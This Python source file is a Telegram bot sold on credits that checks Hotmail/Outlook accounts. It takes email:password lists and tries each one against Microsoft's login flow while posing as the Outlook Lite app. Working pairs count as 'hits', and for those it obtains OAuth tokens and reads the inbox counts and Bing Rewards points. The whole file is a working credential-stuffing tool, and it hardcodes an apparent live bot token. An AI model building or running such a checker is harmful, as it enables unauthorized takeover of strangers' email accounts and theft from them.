#!/usr/bin/env python3
"""Hotmail Checker Bot - Railway Ready"""

import re, json, uuid, sqlite3, logging, asyncio, time
from datetime import datetime
import requests, urllib3
urllib3.disable_warnings()
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

BOT_TOKEN = "8544623193:AAGB5p8qqnkPbsmolPkKVpAGW7XmWdmFOak"
ADMIN_ID = 5944410248
DB = "checker.db"

class Database:
    def __init__(self):
        conn = sqlite3.connect(DB)
        try:
            c = conn.cursor()
            c.execute('''CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT, has_access INTEGER DEFAULT 0, credits INTEGER DEFAULT 0, total_checks INTEGER DEFAULT 0, total_hits INTEGER DEFAULT 0, joined_date TEXT, is_banned INTEGER DEFAULT 0)''')
            c.execute('''CREATE TABLE IF NOT EXISTS results (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, email TEXT, status TEXT, inbox_count INTEGER, rewards_points INTEGER, date TEXT)''')
            conn.commit()
        finally:
            conn.close()
    
    def add_user(self, uid, uname, fname):
        conn = sqlite3.connect(DB)
        try:
            c = conn.cursor()
            c.execute('INSERT OR IGNORE INTO users (user_id, username, first_name, joined_date) VALUES (?, ?, ?, ?)', (uid, uname or "", fname or "", datetime.now().isoformat()))
            conn.commit()
        finally:
            conn.close()
    
    def has_access(self, uid):
        if uid == ADMIN_ID: return True
        conn = sqlite3.connect(DB)
        try:
            c = conn.cursor()
            c.execute('SELECT has_access FROM users WHERE user_id = ?', (uid,))
            r = c.fetchone()
            return r and r[0] == 1
        finally:
            conn.close()
    
    def is_banned(self, uid):
        conn = sqlite3.connect(DB)
        try:
            c = conn.cursor()
            c.execute('SELECT is_banned FROM users WHERE user_id = ?', (uid,))
            r = c.fetchone()
            return r and r[0] == 1
        finally:
            conn.close()
    
    def grant(self, uid, creds=10):
        conn = sqlite3.connect(DB)
        try:
            c = conn.cursor()
            c.execute('''INSERT OR REPLACE INTO users (user_id, username, first_name, has_access, credits, joined_date, total_checks, total_hits, is_banned) VALUES (?, ?, ?, 1, ?, COALESCE((SELECT joined_date FROM users WHERE user_id = ?), ?), COALESCE((SELECT total_checks FROM users WHERE user_id = ?), 0), COALESCE((SELECT total_hits FROM users WHERE user_id = ?), 0), 0)''', (uid, f"user_{uid}", f"User{uid}", creds, uid, datetime.now().isoformat(), uid, uid))
            conn.commit()
        finally:
            conn.close()
    
    def revoke(self, uid):
        conn = sqlite3.connect(DB)
        try:
            c = conn.cursor()
            c.execute('UPDATE users SET has_access = 0 WHERE user_id = ?', (uid,))
            conn.commit()
        finally:
            conn.close()
    
    def get_credits(self, uid):
        conn = sqlite3.connect(DB)
        try:
            c = conn.cursor()
            c.execute('SELECT credits FROM users WHERE user_id = ?', (uid,))
            r = c.fetchone()
            return r[0] if r else 0
        finally:
            conn.close()
    
    def add_credits(self, uid, amt):
        conn = sqlite3.connect(DB)
        try:
            c = conn.cursor()
            c.execute('UPDATE users SET credits = credits + ? WHERE user_id = ?', (amt, uid))
            conn.commit()
        finally:
            conn.close()
    
    def use_credit(self, uid):
        conn = sqlite3.connect(DB)
        try:
            c = conn.cursor()
            c.execute('UPDATE users SET credits = credits - 1 WHERE user_id = ?', (uid,))
            conn.commit()
        finally:
            conn.close()
    
    def save_result(self, uid, email, status, inbox, points):
        conn = sqlite3.connect(DB)
        try:
            c = conn.cursor()
            c.execute('INSERT INTO results (user_id, email, status, inbox_count, rewards_points, date) VALUES (?, ?, ?, ?, ?, ?)', (uid, email, status, inbox, points, datetime.now().isoformat()))
            if status == 'hit':
                c.execute('UPDATE users SET total_checks = total_checks + 1, total_hits = total_hits + 1 WHERE user_id = ?', (uid,))
            else:
                c.execute('UPDATE users SET total_checks = total_checks + 1 WHERE user_id = ?', (uid,))
            conn.commit()
        finally:
            conn.close()
    
    def get_users(self):
        conn = sqlite3.connect(DB)
        try:
            c = conn.cursor()
            c.execute('SELECT user_id, username, first_name, has_access, credits, total_checks FROM users LIMIT 20')
            return c.fetchall()
        finally:
            conn.close()
    
    def get_stats(self):
        conn = sqlite3.connect(DB)
        try:
            c = conn.cursor()
            c.execute('SELECT COUNT(*) FROM users')
            t = c.fetchone()[0]
            c.execute('SELECT COUNT(*) FROM users WHERE has_access = 1')
            a = c.fetchone()[0]
            c.execute('SELECT SUM(total_checks) FROM users')
            ch = c.fetchone()[0] or 0
            c.execute('SELECT SUM(total_hits) FROM users')
            h = c.fetchone()[0] or 0
            return {'total': t, 'active': a, 'checks': ch, 'hits': h}
        finally:
            conn.close()
    
    def user_stats(self, uid):
        conn = sqlite3.connect(DB)
        try:
            c = conn.cursor()
            c.execute('SELECT total_checks, total_hits FROM users WHERE user_id = ?', (uid,))
            r = c.fetchone()
            return {'checks': r[0], 'hits': r[1]} if r else {'checks': 0, 'hits': 0}
        finally:
            conn.close()

class Checker:
    def __init__(self):
        self.s = requests.Session()
        self.s.verify = False
        self.s.headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        self.uuid = str(uuid.uuid4())
    
    def check(self, email, pwd):
        r = {'email': email, 'status': 'error', 'inbox': 0, 'points': 0}
        try:
            # IDP
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            h1 = {"X-OneAuth-AppName": "Outlook Lite", "X-Office-Version": "3.11.0-minApi24", "X-CorrelationId": self.uuid, "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)", "Host": "odc.officeapps.live.com", "Connection": "Keep-Alive", "Accept-Encoding": "gzip"}
            r1 = self.s.get(url1, headers=h1, timeout=15)
            if any(x in r1.text for x in ["Neither", "Both", "Placeholder", "OrgId"]) or "MSAccount" not in r1.text:
                r['status'] = 'bad'
                return r
            time.sleep(0.3)
            
            # OAuth
            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            h2 = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.9", "Connection": "keep-alive"}
            r2 = self.s.get(url2, headers=h2, allow_redirects=True, timeout=15)
            
            # Extract
            url_m = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_m = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            if not url_m or not ppft_m:
                r['status'] = 'bad'
                return r
            post_url = url_m.group(1).replace("\\/", "/")
            ppft = ppft_m.group(1)
            
            # Login
            data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={pwd}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
            h3 = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Origin": "https://login.live.com", "Referer": r2.url}
            r3 = self.s.post(post_url, data=data, headers=h3, allow_redirects=False, timeout=15)
            
            # Check
            txt = r3.text.lower()
            if "account or password is incorrect" in txt or r3.text.count("error") > 0:
                r['status'] = 'bad'
                return r
            if "identity/confirm" in txt or "consent" in txt:
                r['status'] = '2fa'
                return r
            if "abuse" in txt:
                r['status'] = 'locked'
                return r
            
            # Code
            loc = r3.headers.get("Location", "")
            if not loc:
                r['status'] = 'bad'
                return r
            code_m = re.search(r'code=([^&]+)', loc)
            if not code_m:
                r['status'] = 'bad'
                return r
            code = code_m.group(1)
            cid = self.s.cookies.get("MSPCID", "")
            if not cid:
                r['status'] = 'bad'
                return r
            cid = cid.upper()
            
            # Token
            token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            r4 = self.s.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=15)
            if "access_token" not in r4.text:
                r['status'] = 'bad'
                return r
            token = r4.json()["access_token"]
            r['status'] = 'hit'
            
            # Inbox
            try:
                h5 = {"Host": "outlook.live.com", "content-length": "0", "x-owa-sessionid": str(uuid.uuid4()), "x-req-source": "Mini", "authorization": f"Bearer {token}", "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N) AppleWebKit/537.36", "action": "StartupData", "content-type": "application/json"}
                r5 = self.s.post(f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0", data="", headers=h5, timeout=20)
                if r5.status_code == 200 and '"Inbox":' in r5.text:
                    m = re.search(r'"Inbox":\s*\[\s*{\s*"TotalCount":\s*(\d+)', r5.text)
                    if m: r['inbox'] = int(m.group(1))
            except:
                pass
            
            # Rewards
            try:
                h6 = {"Authorization": f"Bearer {token}", "User-Agent": "Mozilla/5.0"}
                r6 = self.s.get("https://rewards.bing.com/api/getuserinfo", headers=h6, timeout=10)
                if r6.status_code == 200:
                    r['points'] = r6.json().get('availablePoints', 0)
            except:
                pass
            
            return r
        except:
            r['status'] = 'error'
            return r

db = Database()

async def start(u: Update, c: ContextTypes.DEFAULT_TYPE):
    user = u.effective_user
    db.add_user(user.id, user.username, user.first_name)
    if db.is_banned(user.id):
        await u.message.reply_text("Banned")
        return
    if user.id == ADMIN_ID:
        t = "ADMIN\n\n/admin\n/check\n/help"
    elif db.has_access(user.id):
        cr = db.get_credits(user.id)
        t = f"Credits: {cr}\n\n/check\n/credits\n/help"
    else:
        t = "No access"
    await u.message.reply_text(t)

async def help_cmd(u: Update, c: ContextTypes.DEFAULT_TYPE):
    await u.message.reply_text("HELP\n\n/start\n/check\n/credits\n\nFormat:\nemail:password")

async def admin(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if u.effective_user.id != ADMIN_ID:
        await u.message.reply_text("Admin only")
        return
    s = db.get_stats()
    t = f"ADMIN\n\nUsers: {s['total']}\nActive: {s['active']}\nChecks: {s['checks']}\nHits: {s['hits']}"
    kb = [[InlineKeyboardButton("Grant", callback_data="grant")], [InlineKeyboardButton("Revoke", callback_data="revoke")], [InlineKeyboardButton("Credits", callback_data="creds")], [InlineKeyboardButton("Users", callback_data="users")]]
    await u.message.reply_text(t, reply_markup=InlineKeyboardMarkup(kb))

async def check(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if db.is_banned(uid):
        await u.message.reply_text("Banned")
        return
    if not db.has_access(uid):
        c.user_data['w'] = False
        await u.message.reply_text("No access")
        return
    if uid != ADMIN_ID and db.get_credits(uid) <= 0:
        c.user_data['w'] = False
        await u.message.reply_text("No credits")
        return
    await u.message.reply_text("Send:\nemail:password")
    c.user_data['w'] = True

async def credits_cmd(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if db.is_banned(uid):
        await u.message.reply_text("Banned")
        return
    cr = db.get_credits(uid)
    s = db.user_stats(uid)
    await u.message.reply_text(f"Credits: {cr}\nChecks: {s['checks']}\nHits: {s['hits']}")

async def handle(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if not c.user_data.get('w'): return
    uid = u.effective_user.id
    if db.is_banned(uid) or not db.has_access(uid):
        c.user_data['w'] = False
        await u.message.reply_text("Denied")
        return
    txt = u.message.text
    lines = [l.strip() for l in txt.split('\n') if ':' in l]
    if not lines:
        c.user_data['w'] = False
        await u.message.reply_text("Invalid")
        return
    accs = []
    for l in lines:
        try:
            e, p = l.split(':', 1)
            accs.append((e.strip(), p.strip()))
        except: continue
    if not accs:
        c.user_data['w'] = False
        await u.message.reply_text("No valid accounts")
        return
    if uid != ADMIN_ID:
        cr = db.get_credits(uid)
        if cr < len(accs):
            c.user_data['w'] = False
            await u.message.reply_text(f"Need {len(accs)}, have {cr}")
            return
    c.user_data['w'] = False
    await u.message.reply_text(f"Checking {len(accs)}...")
    h, b, t, l, e = 0, 0, 0, 0, 0
    for i, (email, pwd) in enumerate(accs, 1):
        await u.message.reply_text(f"{i}/{len(accs)}: {email}")
        ch = Checker()
        res = ch.check(email, pwd)
        db.save_result(uid, email, res['status'], res['inbox'], res['points'])
        if res['status'] == 'hit':
            h += 1
            if uid != ADMIN_ID: db.use_credit(uid)
            await u.message.reply_text(f"HIT - {email}\nInbox: {res['inbox']}\nPoints: {res['points']}")
        elif res['status'] == '2fa':
            t += 1
            await u.message.reply_text(f"2FA - {email}")
        elif res['status'] == 'bad':
            b += 1
            await u.message.reply_text(f"BAD - {email}")
        elif res['status'] == 'locked':
            l += 1
            await u.message.reply_text(f"LOCKED - {email}")
        else:
            e += 1
            await u.message.reply_text(f"ERROR - {email}")
        await asyncio.sleep(3)
    await u.message.reply_text(f"DONE\n\nHits: {h}\nBad: {b}\n2FA: {t}\nLocked: {l}\nErrors: {e}\nTotal: {len(accs)}")

async def button(u: Update, c: ContextTypes.DEFAULT_TYPE):
    q = u.callback_query
    await q.answer()
    if q.from_user.id != ADMIN_ID: return
    if q.data == "users":
        users = db.get_users()
        t = "USERS:\n\n"
        for uid, un, fn, acc, cr, ch in users:
            t += f"{'✓' if acc else '✗'} {uid} - {fn or 'Unknown'}\n  Cr: {cr} | Ch: {ch}\n\n"
        if len(t) > 4000: t = t[:4000] + "\n..."
        await q.message.reply_text(t)
    elif q.data == "grant":
        await q.message.reply_text("!grant USER_ID CREDITS\nEx: !grant 123 10")
        c.user_data['a'] = 'grant'
    elif q.data == "revoke":
        await q.message.reply_text("!revoke USER_ID\nEx: !revoke 123")
        c.user_data['a'] = 'revoke'
    elif q.data == "creds":
        await q.message.reply_text("!credits USER_ID AMT\nEx: !credits 123 5")
        c.user_data['a'] = 'credits'

async def admin_cmd(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if u.effective_user.id != ADMIN_ID or not u.message.text.startswith('!'): return
    txt = u.message.text.strip()
    act = c.user_data.get('a')
    if not act: return
    try:
        p = txt.split()
        if act == 'grant' and len(p) >= 2:
            uid = int(p[1])
            cr = int(p[2]) if len(p) > 2 else 10
            db.grant(uid, cr)
            await u.message.reply_text(f"Granted {uid}")
            c.user_data['a'] = None
        elif act == 'revoke' and len(p) >= 2:
            uid = int(p[1])
            db.revoke(uid)
            await u.message.reply_text(f"Revoked {uid}")
            c.user_data['a'] = None
        elif act == 'credits' and len(p) >= 3:
            uid = int(p[1])
            amt = int(p[2])
            db.add_credits(uid, amt)
            await u.message.reply_text(f"Added {amt} to {uid}")
            c.user_data['a'] = None
    except Exception as e:
        await u.message.reply_text(f"Error: {e}")

def main():
    logger.info("Starting...")
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("admin", admin))
    app.add_handler(CommandHandler("check", check))
    app.add_handler(CommandHandler("credits", credits_cmd))
    app.add_handler(CallbackQueryHandler(button))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.Regex(r'^!'), admin_cmd))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & ~filters.Regex(r'^!'), handle))
    logger.info("Running!")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
